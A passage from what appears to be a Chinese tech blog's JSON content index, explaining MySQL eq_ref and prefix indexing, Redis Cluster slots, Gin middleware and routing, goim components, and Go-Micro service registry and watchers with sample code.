典型场景示例 1-- 示例1：主键关联查询 2SELECT * 3FROM orders 4JOIN users ON orders.user_id = users.id -- users.id 是主键 5WHERE users.id = 100; 6 7-- 示例2：唯一索引关联查询 8SELECT * 9FROM product 10JOIN inventory ON product.sku = inventory.sku -- inventory.sku 是唯一索引 11WHERE product.category = \u0026#39;electronics\u0026#39;; 3. 与其他类型对比 类型 索引类型 匹配行数 典型场景 const 主键/唯一索引 单行 单表主键精确查询 eq_ref 主键/唯一索引 单行 多表主键或唯一键关联 ref 非唯一索引 多行 普通索引的等值查询 range 索引 范围匹配多行 BETWEEN、IN等范围查询 4. 优化意义 高效性：通过唯一索引直接定位单条记录，避免了全表扫描或索引范围查找。 关联查询优化：在多表连接中，若驱动表（外层表）的关联字段是主键或唯一键，被驱动表的type可能为eq_ref，表明连接效率较高。 需满足条件：若未达到eq_ref（如出现ref或ALL），需检查关联字段是否为唯一索引，或数据是否存在重复值。 5. 注意事项 LEFT JOIN限制：主表LEFT JOIN从表时，若未对从表添加过滤条件，可能导致全表扫描（ALL），需通过WHERE子句强制使用索引。 复合唯一索引：若使用联合唯一索引，需确保查询条件包含所有索引列，否则可能降级为ref。 通过分析eq_ref类型，可以确认关联查询是否有效利用了唯一性约束，是优化复杂查询的重要指标。若需进一步优化，可结合key（实际使用索引）、rows（扫描行数）等字段综合分析。\n","link":"https://www.qiankun.info/posts/eq_ref-%E8%AE%BF%E9%97%AE%E7%B1%BB%E5%9E%8B/","section":"posts","tags":["性能优化","mysql"],"title":"eq_ref 访问类型"},{"body":"Redis 集群中的槽（Slot）是一种核心的数据分片机制，用于将数据均匀分布到多个节点，实现负载均衡和高可用性。以下是槽的详细解释：\n1. 槽的基本概念 定义与数量\nRedis 集群将整个数据集划分为 16384 个固定槽位（编号 0-16383），每个键通过 CRC16(key) % 16384 计算其归属的槽。槽位的数量固定，便于数据迁移和节点管理。\n作用\n数据分片：每个节点负责管理一部分槽位，例如 3 节点集群中每个节点可能管理约 5461 个槽。 负载均衡：槽位分布决定了数据在不同节点的存储位置，避免单节点压力过大。 动态扩展：通过槽的迁移实现集群在线扩容或缩容。 2. 槽的分配与动态迁移 初始分配\n槽位可通过 CLUSTER ADDSLOTS 命令手动分配给节点，例如节点 A 负责槽 0-4095，节点 B 负责 4096-8191 等。\n集群上线条件：所有 16384 个槽必须被分配，否则集群处于下线状态。 动态迁移\n当新增或删除节点时，槽位可重新分配：\n扩容：从现有节点各转移部分槽到新节点（如 4 节点集群每个节点分配约 4096 个槽）。 缩容：移除节点前需将其槽位迁移至其他节点。 迁移方式：直接迁移整个槽的数据，而非单个键，提升效率。 3. 槽的管理与通信 节点元数据\n每个节点维护完整的集群元数据，包括槽位分配、节点状态等，通过 Gossip 协议（PING/PONG 消息）与其他节点交换信息。\n故障检测：节点间心跳超时标记为疑似下线（PFAIL），超过半数主节点确认后标记为下线（FAIL），触发故障转移。\n客户端路由\nSmart 客户端：客户端缓存槽位与节点的映射关系，直接定位目标节点，避免多次重定向。 MOVED 重定向：若客户端请求错误节点，返回 MOVED 响应并指引正确节点。 4. 槽与操作限制 跨槽操作限制\n事务、Lua 脚本等需确保所有操作的键位于同一槽。可通过 哈希标签（如 user:{123}.name）强制多个键映射到同一槽。 批量操作限制：MSET、MGET 等命令仅支持同一槽内的键。 5. 槽的设计优势 灵活性 相比一致性哈希，槽允许手动调整分配比例（如高性能节点分配更多槽）。 解耦数据与节点的直接关系，简化扩缩容流程。 高效性 迁移时以槽为单位，而非单个键，减少网络开销。 16384 槽数在心跳包大小（2KB）和扩展性（支持千级节点）间取得平衡。 6. 槽的状态与故障恢复 槽的三种状态 未指派：未被任何节点管理。 已指派：由某节点负责。 导入中：正在迁移数据到新节点。 故障转移\n主节点故障时，从节点通过 Raft 算法选举晋升为主节点，并接管原主节点的槽位，更新配置纪元（Epoch）以优先新配置。 总结 Redis 槽机制通过固定数量的逻辑分片（16384 槽）实现了高效的数据分布、动态扩缩容和故障恢复，是 Redis Cluster 高可用与高性能的核心设计。\n","link":"https://www.qiankun.info/posts/redis-%E6%A7%BD/","section":"posts","tags":["redis"],"title":"Redis Slot"},{"body":"","link":"https://www.qiankun.info/tags/gin/","section":"tags","tags":null,"title":"Gin"},{"body":"在Gin框架中，中间件（Middleware）是处理HTTP请求的重要组成部分，允许开发者在请求到达处理函数前后执行特定逻辑。以下是对Gin中间件的详细解释：\n1. 中间件的基本概念 中间件是一种函数（类型为gin.HandlerFunc），接收*gin.Context参数，用于：\n拦截请求：在请求处理前或处理后执行代码。 共享逻辑：复用如日志、认证、错误处理等逻辑。 控制流程：决定是否继续执行后续中间件或终止请求。 2. 中间件的执行流程 Gin中间件遵循洋葱模型，按添加顺序依次执行，流程如下：\n顺序执行：先添加的中间件先执行。 c.Next()：调用后，暂停当前中间件，执行后续中间件及路由处理函数。 逆序返回：后续处理完成后，回到当前中间件继续执行剩余代码。 示例：\n1func Middleware1(c *gin.Context) { 2 fmt.Println(\u0026#34;Start Middleware1\u0026#34;) 3 c.Next() // 执行后续中间件 4 fmt.Println(\u0026#34;End Middleware1\u0026#34;) 5} 6 7func Middleware2(c *gin.Context) { 8 fmt.Println(\u0026#34;Start Middleware2\u0026#34;) 9 c.Next() 10 fmt.Println(\u0026#34;End Middleware2\u0026#34;) 11} 12 13// 添加顺序：Middleware1 → Middleware2 14// 输出顺序： 15// Start Middleware1 → Start Middleware2 → 处理请求 → End Middleware2 → End Middleware1 3. 中间件的使用方式 全局中间件 通过gin.Engine.Use()添加，对所有路由生效：\n1r := gin.Default() 2r.Use(Middleware1, Middleware2) 路由组中间件 对特定路由组生效：\n1adminGroup := r.Group(\u0026#34;/admin\u0026#34;) 2adminGroup.Use(AuthMiddleware()) // 仅/admin路径生效 路由级别中间件 在定义路由时添加：\n1r.GET(\u0026#34;/user\u0026#34;, AuthMiddleware(), UserHandler) 4. 常用中间件场景 日志记录 1func Logger() gin.HandlerFunc { 2 return func(c *gin.Context) { 3 start := time.Now() 4 c.Next() 5 duration := time.Since(start) 6 log.Printf(\u0026#34;路径: %s | 耗时: %v\u0026#34;, c.Request.URL, duration) 7 } 8} 身份验证 1func AuthMiddleware() gin.HandlerFunc { 2 return func(c *gin.Context) { 3 token := c.GetHeader(\u0026#34;Authorization\u0026#34;) 4 if token != \u0026#34;valid_token\u0026#34; { 5 c.AbortWithStatusJSON(401, gin.H{\u0026#34;error\u0026#34;: \u0026#34;未授权\u0026#34;}) 6 return 7 } 8 c.Next() 9 } 10} 错误处理 1func RecoveryMiddleware() gin.HandlerFunc { 2 return func(c *gin.Context) { 3 defer func() { 4 if err := recover(); err != nil { 5 c.AbortWithStatusJSON(500, gin.H{\u0026#34;error\u0026#34;: \u0026#34;服务器内部错误\u0026#34;}) 6 } 7 }() 8 c.Next() 9 } 10} 跨域处理（CORS） 1func CorsMiddleware() gin.HandlerFunc { 2 return func(c *gin.Context) { 3 c.Writer.Header().Set(\u0026#34;Access-Control-Allow-Origin\u0026#34;, \u0026#34;*\u0026#34;) 4 c.Writer.Header().Set(\u0026#34;Access-Control-Allow-Methods\u0026#34;, \u0026#34;GET, POST, PUT, DELETE\u0026#34;) 5 c.Next() 6 } 7} 5. 关键方法 c.Next()：执行后续中间件和路由处理函数。 c.Abort()：终止后续处理，当前中间件后的逻辑不再执行。 c.AbortWithStatus(code)：终止并返回HTTP状态码。 c.Set(key, value) / c.Get(key)：在中间件间传递数据。 6. 内置中间件 Gin默认提供两个中间件：\ngin.Logger()：记录请求日志。 gin.Recovery()：捕获panic并返回500错误。 通过gin.Default()自动加载，而gin.New()则不会。\n7. 自定义中间件示例 记录响应时间：\n1func ResponseTime() gin.HandlerFunc { 2 return func(c *gin.Context) { 3 start := time.Now() 4 c.Next() 5 c.Writer.Header().Set(\u0026#34;X-Response-Time\u0026#34;, fmt.Sprintf(\u0026#34;%v\u0026#34;, time.Since(start))) 6 } 7} 使用中间件：\n1r := gin.New() 2r.Use(ResponseTime()) 8. 注意事项 执行顺序：中间件按添加顺序执行，需注意依赖关系。 性能：避免在中间件中执行阻塞操作（如同步数据库查询）。 上下文安全：*gin.Context是协程安全的，可传递请求级别数据。 通过合理使用中间件，可以极大提升Gin应用的灵活性和可维护性，实现功能解耦和逻辑复用。\n","link":"https://www.qiankun.info/posts/gin-%E4%B8%AD%E9%97%B4%E4%BB%B6/","section":"posts","tags":["go","gin"],"title":"Gin 中间件"},{"body":"","link":"https://www.qiankun.info/tags/goim/","section":"tags","tags":null,"title":"Goim"},{"body":"goim 是一个基于 Go 语言实现的高性能即时通讯框架，其核心组件包括以下四个部分：\n1. Comet（接入层） 功能：维护客户端的长连接，负责消息的实时推送。支持 WebSocket、TCP、HTTP 等多种协议，并处理客户端的心跳检测和鉴权验证。 特点：横向扩展能力强，可通过服务发现动态扩容。每个连接对应一个 Channel 结构体，管理用户订阅的房间（Room）和消息推送逻辑。 2. Logic（逻辑层） 功能：接收客户端通过 HTTP 推送的消息，进行鉴权后将消息分发到 Kafka 消息队列；同时通过 gRPC 为 Comet 提供连接信息存储和验证服务。 流程：处理单推、多推、广播等消息类型，并与 Redis 交互存储用户在线状态和连接信息。 3. Job（消息消费层） 功能：作为 Kafka 的消费者，从消息队列中获取数据，根据消息类型（如单聊、群聊、广播）分发给对应的 Comet 节点进行推送。 扩展性：通过 Kafka 的 Partition 机制实现负载均衡，支持动态扩展以应对高并发场景。 4. Discovery（服务发现） 功能：类似 Eureka，负责各组件（Comet、Logic、Job）的注册与发现，确保集群动态扩容时服务可感知。 实现：采用 B 站自研的发现机制，但可通过修改配置适配其他服务发现工具（如 etcd）。 组件协作流程 客户端通过 Comet 建立连接，Logic 验证身份并将连接信息存储至 Redis。 业务方通过 HTTP 接口向 Logic 发送消息，Logic 将消息写入 Kafka。 Job 消费 Kafka 消息后，通过 gRPC 调用 Comet 的推送接口，最终将消息送达客户端。 Discovery 监控各节点状态，确保服务动态扩容时的可用性。 补充说明 存储依赖：Redis 用于存储在线用户信息，Kafka 作为消息队列解耦各组件，但两者属于基础设施而非核心功能模块。 扩展性设计：Comet 和 Job 可通过增加节点实现水平扩展，Logic 作为无状态服务可通过负载均衡（如 Nginx）提升吞吐量。 这些组件的协同工作使 goim 能够支撑高并发、低延迟的即时通讯场景。\n","link":"https://www.qiankun.info/posts/goim-%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6/","section":"posts","tags":["go","goim"],"title":"goim 核心组件"},{"body":"在 Gin 框架中，Engine 是整个 Web 应用的核心容器，负责管理路由、中间件、请求处理流程等核心功能。以下从多个角度详细解释其设计与作用：\n一、Engine 的初始化与创建 Gin 提供两种初始化 Engine 的方式：\ngin.New()\n生成一个“空”的 Engine 实例，不包含任何默认中间件。开发者需手动添加所需功能（如日志、错误恢复等）。\ngin.Default()\n调用 gin.New() 并自动附加 Logger（请求日志） 和 Recovery（错误恢复） 中间件。这是推荐的基础初始化方式，适用于大多数场景。\n1// 使用默认中间件（Logger + Recovery） 2engine := gin.Default() 3 4// 完全自定义初始化（无默认中间件） 5engine := gin.New() 二、Engine 的核心组件与结构 Engine 通过以下关键组件实现功能：\nRouterGroup（路由组）\n管理路由规则和中间件链，支持嵌套分组路由（如 /api/v1/users）。所有路由方法（如 GET, POST）均通过 RouterGroup 实现。\n路由树（Radix Tree）\n使用 字典树（Radix Tree） 结构存储路由与处理函数的映射，实现高效的路由匹配（时间复杂度接近 O(1)）。\n中间件链（Middleware Chain）\n通过 engine.Use() 注册的中间件会存储在全局链中，每个请求会依次执行这些中间件，最后调用路由处理函数。例如：\n1engine.Use(Logger(), Recovery()) // 注册全局中间件 Context 上下文对象\n每个请求会生成独立的 gin.Context，封装了请求参数、响应方法（如 JSON()、String()）及中间件间的数据传递功能。\n三、Engine 的请求处理流程 Engine 处理 HTTP 请求的流程如下：\n初始化阶段\n调用 engine.Run() 启动 HTTP 服务（默认监听 8080 端口）。 路由和中间件注册完成后，形成路由树和中间件链。 请求处理阶段\n当请求到达时：\n匹配路由路径和方法，提取路径参数（如 /user/:name）。 按顺序执行全局中间件和路由组中间件。 调用对应的处理函数生成响应。 四、Engine 的最佳实践 路由组织\n使用路由分组（Group()）实现模块化，例如分离 API 和静态资源路由：\n1api := engine.Group(\u0026#34;/api\u0026#34;) 2{ 3 api.GET(\u0026#34;/users\u0026#34;, listUsers) 4 api.POST(\u0026#34;/upload\u0026#34;, uploadFile) 5} 中间件选择\n全局中间件（如日志、跨域处理）通过 engine.Use() 注册。 路由级中间件通过 router.Group() 的第二个参数添加。 性能优化\n避免在中间件中执行阻塞操作（如数据库查询）。 使用 gin.SetMode(gin.ReleaseMode) 关闭调试信息以提升性能。 五、与其他框架的对比 与标准库 net/http 相比，Engine 通过以下特性显著简化开发：\n声明式路由：支持参数化路径、路由分组等高级特性。 中间件复用：通过链式调用实现功能模块化。 高性能设计：路由匹配效率接近原生，适合高并发场景。 通过上述分析可见，Engine 是 Gin 框架的“大脑”，其高效的路由机制和灵活的中间件体系为构建高性能 Web 应用提供了坚实基础。\n","link":"https://www.qiankun.info/posts/gin-engine/","section":"posts","tags":["go","gin"],"title":"Gin Engine"},{"body":"Gin 框架中的 RouterGroup（路由组） 是组织和管理路由的重要机制，它允许将一组具有相同前缀路径或共用中间件的路由逻辑性地分组，提高代码的可读性和可维护性。\nRouterGroup 的核心作用 统一前缀路径\n为一组路由设置公共的 URL 前缀（例如 /api/v1）。 批量添加中间件\n为一组路由统一添加中间件（如认证、日志、权限检查）。 嵌套结构\n支持路由组的嵌套，形成层次化路由结构。 创建路由组 通过 Group() 方法创建路由组，语法如下：\n1router := gin.Default() 2v1 := router.Group(\u0026#34;/v1\u0026#34;) // 创建以 /v1 为前缀的路由组 3admin := router.Group(\u0026#34;/admin\u0026#34;) // 另一个路由组 路由组的用法 1. 统一前缀路径 1api := router.Group(\u0026#34;/api\u0026#34;) 2{ 3 api.GET(\u0026#34;/users\u0026#34;, listUsers) // 实际路径: /api/users 4 api.POST(\u0026#34;/users\u0026#34;, createUser) // 实际路径: /api/users 5} 2. 批量添加中间件 1auth := router.Group(\u0026#34;/auth\u0026#34;) 2auth.Use(AuthMiddleware()) // 为该组所有路由添加认证中间件 3{ 4 auth.GET(\u0026#34;/profile\u0026#34;, getProfile) 5 auth.POST(\u0026#34;/logout\u0026#34;, logout) 6} 3. 嵌套路由组 1v1 := router.Group(\u0026#34;/v1\u0026#34;) 2{ 3 // 子路由组 /v1/admin 4 admin := v1.Group(\u0026#34;/admin\u0026#34;) 5 admin.Use(AdminCheck()) // 仅对 /v1/admin 下的路由生效 6 { 7 admin.GET(\u0026#34;/stats\u0026#34;, getStats) // 路径: /v1/admin/stats 8 } 9} 实际应用场景 RESTful API 版本管理\n通过 /v1、/v2 路由组区分不同 API 版本。\n权限分层\n公共路由、用户路由、管理员路由通过不同路由组隔离。\n模块化开发\n将不同功能模块（如 /user、/order）的路由分组到不同文件中。\n注意事项 中间件作用范围\n路由组的中间件仅对组内路由生效，不会影响其他路由组。\n路径优先级\nGin 的路由匹配是精确匹配，子路由组路径会继承父组前缀。\n代码组织\n可以将路由组的定义拆分到不同函数或文件中，例如：\n1func setupUserRoutes(r *gin.RouterGroup) { 2 r.GET(\u0026#34;/\u0026#34;, getUsers) 3 r.POST(\u0026#34;/\u0026#34;, createUser) 4} 5// 主函数中调用 6userGroup := router.Group(\u0026#34;/users\u0026#34;) 7setupUserRoutes(userGroup) 完整示例 1package main 2 3import \u0026#34;github.com/gin-gonic/gin\u0026#34; 4 5func main() { 6 router := gin.Default() 7 8 // 公共路由组（无中间件） 9 public := router.Group(\u0026#34;/public\u0026#34;) 10 { 11 public.GET(\u0026#34;/info\u0026#34;, func(c *gin.Context) { 12 c.String(200, \u0026#34;Public Information\u0026#34;) 13 }) 14 } 15 16 // 私有路由组（需要认证） 17 private := router.Group(\u0026#34;/private\u0026#34;) 18 private.Use(AuthMiddleware()) 19 { 20 private.GET(\u0026#34;/profile\u0026#34;, func(c *gin.Context) { 21 c.String(200, \u0026#34;User Profile\u0026#34;) 22 }) 23 24 // 嵌套子路由组 25 admin := private.Group(\u0026#34;/admin\u0026#34;) 26 admin.Use(AdminCheck()) 27 { 28 admin.GET(\u0026#34;/stats\u0026#34;, func(c *gin.Context) { 29 c.String(200, \u0026#34;Admin Stats\u0026#34;) 30 }) 31 } 32 } 33 34 router.Run(\u0026#34;:8080\u0026#34;) 35} 36 37// 示例中间件 38func AuthMiddleware() gin.HandlerFunc { 39 return func(c *gin.Context) { 40 // 假设进行身份验证 41 if c.GetHeader(\u0026#34;Authorization\u0026#34;) == \u0026#34;\u0026#34; { 42 c.AbortWithStatus(401) 43 return 44 } 45 c.Next() 46 } 47} 48 49func AdminCheck() gin.HandlerFunc { 50 return func(c *gin.Context) { 51 // 检查管理员权限 52 if c.GetHeader(\u0026#34;Role\u0026#34;) != \u0026#34;admin\u0026#34; { 53 c.AbortWithStatus(403) 54 return 55 } 56 c.Next() 57 } 58} 通过合理使用路由组，可以显著提升 Gin 项目的结构清晰度，减少重复代码，并更高效地管理路由和中间件。\n","link":"https://www.qiankun.info/posts/gin-%E8%B7%AF%E7%94%B1%E7%BB%84/","section":"posts","tags":["go","gin"],"title":"Gin 路由组"},{"body":"当对 name 列的所有内容建立完整索引时，WHERE name LIKE 'John%' 仍然可以利用索引的核心原因在于 B+Tree 索引的排序存储特性和 前缀匹配的天然优势。以下是详细解释：\n1. B+Tree 索引的排序存储 完整索引会存储 name 列的完整值，并按字符顺序排序在 B+Tree 结构中。例如，值 'John'、'Johnny'、'Johnson' 会按字典序排列为：\n1John 2Johnson 3Johnny 4... 由于索引键是完全有序的，数据库可以通过以下步骤高效处理 LIKE 'John%'：\n定位起点：快速找到第一个以 'John' 开头的索引条目（通过二分查找或树遍历）。 顺序扫描：从起点开始，顺序读取后续所有以 'John' 开头的条目，直到遇到不匹配的值（如 'Jonathan' 后的 'Mike'）。 这一过程仅需遍历索引的一部分，无需全表扫描。\n2. 前缀匹配的天然优势 LIKE 'John%' 是典型的前缀匹配查询，而 B+Tree 索引的排序特性使其天然支持此类查询。以下对比说明不同匹配模式的索引利用率：\n查询模式 是否利用索引 原因 WHERE name LIKE 'John%' ✅ 是 前缀匹配，索引有序，可快速定位起点并顺序扫描。 WHERE name LIKE '%John' ❌ 否 后缀匹配，索引无法反向遍历，需全表扫描。 WHERE name = 'John' ✅ 是 精确匹配，直接通过索引定位。 3. 完整索引 vs 前缀索引 虽然完整索引和前缀索引都支持 LIKE 'John%'，但二者在性能和存储上有差异：\n特性 完整索引 前缀索引 存储空间 较大（存储完整值） 较小（仅存储前缀） 查询性能 更高（无需回表验证） 可能较低（需回表验证） 适用场景 精确匹配、前缀匹配 前缀匹配、存储敏感场景 完整索引的优势：\n由于存储了完整值，数据库在索引中即可完成 LIKE 'John%' 的匹配，无需回表读取数据行验证完整值（覆盖索引）。而前缀索引可能需要回表确认剩余字符是否匹配。 4. 覆盖索引的进一步优化 如果查询仅需访问 name 列（如 SELECT name FROM users WHERE name LIKE 'John%'），完整索引可直接作为覆盖索引（Covering Index），避免访问数据行，进一步提升性能。\n5. 为什么后缀匹配（LIKE '%John'）无法利用索引？ B+Tree 索引的键值按从左到右的字符顺序排序，而 LIKE '%John' 要求匹配末尾的 'John'。由于索引无法反向遍历或跳跃匹配，数据库只能全表扫描所有值，逐个检查是否符合条件。\n总结 使用 name 列的完整内容建立索引时，WHERE name LIKE 'John%' 能利用索引的核心原因是：\n索引的有序性：B+Tree 按完整值排序，支持快速定位前缀匹配的起点。 顺序扫描效率：从起点开始顺序遍历索引条目，直到不满足前缀条件。 避免全表扫描：仅扫描索引的一部分，而非全表数据。 完整索引在支持前缀匹配的同时，还能优化精确匹配和覆盖索引场景，但需权衡存储成本。\n","link":"https://www.qiankun.info/posts/%E5%88%97%E5%89%8D%E7%BC%80%E5%8C%B9%E9%85%8D%E7%B4%A2%E5%BC%95%E7%9A%84%E5%8E%9F%E7%90%86/","section":"posts","tags":["性能优化","mysql"],"title":"列前缀匹配索引的原理"},{"body":"在 Go-Micro 中，Watcher 是 Registry 组件的一个核心功能，用于实时监听服务实例的变化（如服务注册、注销、元数据更新等）。它的作用是通过事件驱动机制，让客户端或服务消费者能够动态感知服务实例的上下线状态，从而实现服务发现的实时性和动态路由。\nWatcher 的核心作用 1. 动态感知服务变化 当新的服务实例注册到注册中心时，Watcher 会触发 Create 事件。 当服务实例注销（如宕机或主动下线）时，Watcher 会触发 Delete 事件。 当服务实例的元数据（如标签、版本、健康状态）更新时，Watcher 会触发 Update 事件。 2. 避免轮询查询 传统服务发现需要客户端定期轮询注册中心，Watcher 通过监听机制避免了频繁的主动查询，降低了注册中心的负载。 事件驱动模型更高效，实时性更强。 3. 支持动态路由 客户端（如负载均衡器）可以通过 Watcher 实时获取服务实例的变化，动态更新本地缓存的服务列表。 结合 Selector（服务选择器）实现智能路由（如基于健康状态的流量切换）。 Watcher 的工作原理 创建 Watcher\n客户端通过 Registry.Watch() 方法创建一个 Watcher，并指定监听的服务名称（可选）。\n1watcher, err := registry.Watch( 2 registry.WatchService(\u0026#34;greeter.service\u0026#34;), // 监听指定服务 3) 如果不指定服务名称，默认监听所有服务的变化。 监听事件\nWatcher 通过 Next() 方法阻塞等待下一个事件，返回 Event 对象。\n1for { 2 event, err := watcher.Next() 3 if err != nil { 4 // 处理错误（如网络中断） 5 break 6 } 7 fmt.Printf(\u0026#34;事件类型: %s, 服务实例: %v\\n\u0026#34;, event.Type, event.Service) 8} 事件类型（Event.Type）\nCreate：新服务实例注册。 Update：服务实例元数据更新。 Delete：服务实例注销。 关闭 Watcher\n使用完成后需显式关闭 Watcher，释放资源。\n1watcher.Stop() 使用示例 场景：客户端监听服务实例变化 1func main() { 2 // 初始化注册中心（以 etcd 为例） 3 registry := etcd.NewRegistry( 4 registry.Addrs(\u0026#34;localhost:2379\u0026#34;), 5 ) 6 7 // 创建 Watcher，监听指定服务 8 watcher, err := registry.Watch( 9 registry.WatchService(\u0026#34;greeter.service\u0026#34;), 10 ) 11 if err != nil { 12 panic(err) 13 } 14 defer watcher.Stop() 15 16 // 启动协程处理事件 17 go func() { 18 for { 19 event, err := watcher.Next() 20 if err != nil { 21 log.Println(\u0026#34;监听错误:\u0026#34;, err) 22 return 23 } 24 switch event.Type { 25 case registry.EventCreate: 26 log.Println(\u0026#34;新实例注册:\u0026#34;, event.Service.Name) 27 case registry.EventDelete: 28 log.Println(\u0026#34;实例注销:\u0026#34;, event.Service.Name) 29 case registry.EventUpdate: 30 log.Println(\u0026#34;实例更新:\u0026#34;, event.Service.Name) 31 } 32 } 33 }() 34 35 // 保持主线程运行 36 select {} 37} Watcher 的高级特性 1. 与 Selector 集成 Go-Micro 的 Selector（服务选择器，如随机选择、轮询）内部使用 Watcher 动态更新服务列表。例如：\n1selector := selector.NewSelector( 2 selector.Registry(registry), // 依赖 Registry 3 selector.SetStrategy(selector.RoundRobin), 4) 2. 事件过滤 可以通过 WatchFilter 过滤特定事件或服务实例：\n1watcher, err := registry.Watch( 2 registry.WatchService(\u0026#34;greeter.service\u0026#34;), 3 registry.WatchFilter(func(event *registry.Event) bool { 4 // 仅关注版本为 \u0026#34;v1.0\u0026#34; 的实例 5 return event.Service.Version == \u0026#34;v1.0\u0026#34; 6 }), 7) 3. 超时与重试 Watcher 的 Next() 方法可能因网络问题阻塞或返回错误，需结合超时机制和重试逻辑。 部分 Registry 实现（如 Consul）支持自动重连。 注意事项 资源释放\n务必调用 watcher.Stop() 避免 Goroutine 泄漏。\n事件顺序性\n不同注册中心（如 etcd 和 ZooKeeper）的事件顺序性可能不同，需谨慎处理时序敏感的逻辑。\n并发安全\nWatcher 的 Next() 方法是非并发安全的，需避免多个 Goroutine 同时调用。\n性能影响\n高频服务变化（如频繁扩缩容）可能产生大量事件，需评估事件处理逻辑的性能。\n总结 Watcher 是 Go-Micro 实现动态服务发现的核心机制，它通过事件监听让微服务架构具备实时响应能力。无论是服务上下线、元数据变更，还是健康状态更新，Watcher 都能帮助系统快速感知变化，从而支撑弹性伸缩、故障转移等分布式场景。\n","link":"https://www.qiankun.info/posts/go-micro-watcher/","section":"posts","tags":["go","go-micro"],"title":"Go Micro Watcher"},{"body":"","link":"https://www.qiankun.info/tags/go-micro/","section":"tags","tags":null,"title":"Go-Micro"},{"body":"Registry 是 Go-Micro 中一个关键组件，负责服务的注册与发现（Service Discovery），确保微服务之间能够动态发现和通信。以下是 Registry 组件的详细介绍：\nRegistry 的核心作用 服务注册（Registration）\n服务启动时，向注册中心注册自身的元数据（如服务名称、地址、端口、协议、健康状态等）。 服务发现（Discovery）\n客户端或其他服务通过注册中心查询可用的服务实例列表，实现动态路由。 健康检查（Health Checking）\n定期检查服务实例的健康状态，自动移除不可用的节点。 元数据存储（Metadata Storage）\n存储服务的附加信息（如版本号、标签、权重等），支持更复杂的路由逻辑。 Registry 接口设计 Go-Micro 的 Registry 通过接口定义，允许开发者选择不同的实现（如 etcd、Consul、ZooKeeper 等）。核心接口如下：\n1type Registry interface { 2 // 注册服务 3 Register(*Service, ...RegisterOption) error 4 // 注销服务 5 Deregister(*Service) error 6 // 查询服务实例 7 GetService(string) ([]*Service, error) 8 // 监听服务变化（如节点上下线） 9 Watch(...WatchOption) (Watcher, error) 10 // 列出所有已注册服务 11 ListServices() ([]*Service, error) 12 // 其他配置方法（如超时设置） 13 // ... 14} Registry 实现（插件） Go-Micro 支持多种注册中心实现，常见的有：\nmdns\n基于组播 DNS 的轻量级实现，适用于本地开发和测试（无需额外依赖）。\n1import \u0026#34;go-micro.dev/v4/registry/mdns\u0026#34; 2registry := mdns.NewRegistry() etcd\n高可用的分布式键值存储，适合生产环境。\n1import \u0026#34;go-micro.dev/v4/registry/etcd\u0026#34; 2registry := etcd.NewRegistry( 3 registry.Addrs(\u0026#34;127.0.0.1:2379\u0026#34;), 4) Consul\n提供健康检查和服务发现功能的工具，支持多数据中心。\n1import \u0026#34;go-micro.dev/v4/registry/consul\u0026#34; 2registry := consul.NewRegistry() ZooKeeper\n分布式协调服务，适用于复杂场景（需权衡性能）。\n1import \u0026#34;github.com/go-micro/plugins/v4/registry/zookeeper\u0026#34; 2registry := zookeeper.NewRegistry() 配置与使用示例 1. 服务端注册服务 1package main 2 3import ( 4 \u0026#34;go-micro.dev/v4\u0026#34; 5 \u0026#34;go-micro.dev/v4/registry\u0026#34; 6) 7 8func main() { 9 // 创建服务，指定注册中心 10 service := micro.NewService( 11 micro.Name(\u0026#34;greeter.service\u0026#34;), 12 micro.Registry(etcd.NewRegistry( 13 registry.Addrs(\u0026#34;localhost:2379\u0026#34;), 14 )), 15 ) 16 17 // 初始化服务 18 service.Init() 19 20 // 注册服务（通常由框架自动完成） 21 // 启动服务 22 if err := service.Run(); err != nil { 23 panic(err) 24 } 25} 2. 客户端发现服务 1func main() { 2 // 初始化客户端 3 service := micro.NewService( 4 micro.Registry(etcd.NewRegistry( 5 registry.Addrs(\u0026#34;localhost:2379\u0026#34;), 6 )), 7 ) 8 service.Init() 9 10 // 查询服务实例 11 services, err := service.Options().Registry.GetService(\u0026#34;greeter.service\u0026#34;) 12 if err != nil { 13 panic(err) 14 } 15 16 // 选择实例（如随机选择） 17 selector := selector.NewSelector( 18 selector.Registry(service.Options().Registry), 19 ) 20 next, _ := selector.Select(\u0026#34;greeter.service\u0026#34;) 21 node, _ := next() 22 23 fmt.Printf(\u0026#34;Found service at %s:%d\\n\u0026#34;, node.Address, node.Port) 24} 高级特性 心跳机制\n服务定期发送心跳到注册中心，若超时未发送，注册中心会标记该实例为不可用。\nWatch 监听\n客户端可通过 Watch 方法监听服务变化（如节点新增/下线），实现动态更新服务列表。\n1watcher, _ := registry.Watch(registry.WatchService(\u0026#34;greeter.service\u0026#34;)) 2defer watcher.Stop() 3for { 4 event, _ := watcher.Next() 5 fmt.Printf(\u0026#34;Event: %s, Instance: %v\\n\u0026#34;, event.Type, event.Service) 6} 缓存机制\n部分 Registry 实现（如 Consul）支持本地缓存，减少对注册中心的频繁查询。\n注意事项 高可用性\n生产环境中，注册中心（如 etcd/Consul）需部署集群以避免单点故障。\n网络分区\n在网络分区场景下，注册中心需配合健康检查机制，避免路由到不可达节点。\nTTL 与超时\n合理设置服务的 TTL（Time-To-Live）和心跳间隔，平衡实时性与性能。\n通过 Registry 组件，Go-Micro 实现了微服务的动态发现与弹性伸缩，是构建分布式系统的核心基础设施。开发者可根据场景选择合适的注册中心实现，并通过接口灵活扩展。\n","link":"https://www.qiankun.info/posts/go-micro-registry/","section":"posts","tags":["go","go-micro"],"title":"Go Micro Registry"},{"body":"Gin 框架是一个高性能的 Go Web 框架，其核心组件设计简洁但功能强大，以下是其主要核心组件及其作用：\n1. Engine（引擎） 作用：Gin 的核心实例，负责管理路由、中间件链和全局配置。 关键功能： 通过 gin.New() 或 gin.Default() 初始化（后者默认绑定了日志和恢复中间件）。 启动 HTTP 服务（Run() 方法）。 管理全局中间件和路由组。 2. RouterGroup（路由组） 作用：实现路由分组和嵌套，支持中间件的层级继承。 关键功能： 使用 Group() 方法创建子路由组。 为路由组绑定中间件（例如鉴权、日志）。 定义 HTTP 方法的路由（GET, POST, PUT, DELETE 等）。 3. Context（上下文） 作用：封装单个 HTTP 请求的上下文，贯穿整个请求生命周期。 关键功能： 请求处理：解析参数（Path/Query/Form/JSON）、请求头、Cookie 等。 响应处理：返回 JSON/XML/HTML、设置状态码、重定向。 数据传递：通过 Set() 和 Get() 在中间件间传递数据。 中间件控制：调用 Next() 执行后续中间件，或 Abort() 终止流程。 4. Middleware（中间件） 作用：通过函数链处理请求前后的逻辑（如日志、鉴权、限流）。 关键机制： 中间件为 func(*Context) 类型，通过 Use() 方法注册。 Gin 